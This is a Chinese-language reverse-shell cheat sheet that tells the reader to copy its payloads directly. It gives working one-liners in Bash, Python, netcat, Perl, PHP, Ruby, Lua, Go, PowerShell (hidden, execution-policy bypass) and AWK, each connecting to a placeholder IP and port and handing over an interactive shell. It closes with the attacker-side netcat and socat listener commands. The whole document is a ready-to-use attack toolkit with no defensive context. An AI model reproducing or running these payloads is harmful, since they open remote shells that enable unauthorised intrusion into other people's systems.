# 反弹 Shell 大全

> 按稳定性和常见度排序。直接复制使用。

## 最稳定

```bash
# Bash
bash -i >& /dev/tcp/{ip}/{port} 0>&1
bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# Netcat (传统版)
nc -e /bin/sh {ip} {port}

# Netcat (OpenBSD版)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
```

## 其他语言

```bash
# Perl
perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/go_shell.go && go run /tmp/go_shell.go
```

## 无 nc 时

```bash
# Bash UDP
sh -i >& /dev/udp/{ip}/{port} 0>&1

# Powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# AWK
awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(1) {do { printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); }} while(c != "exit") close(s); }}' /dev/null
```

## 监听端

```bash
nc -lvnp {port}
rlwrap nc -lvnp {port}  # 带readline支持
socat file:`tty`,raw,echo=0 tcp-listen:{port}
```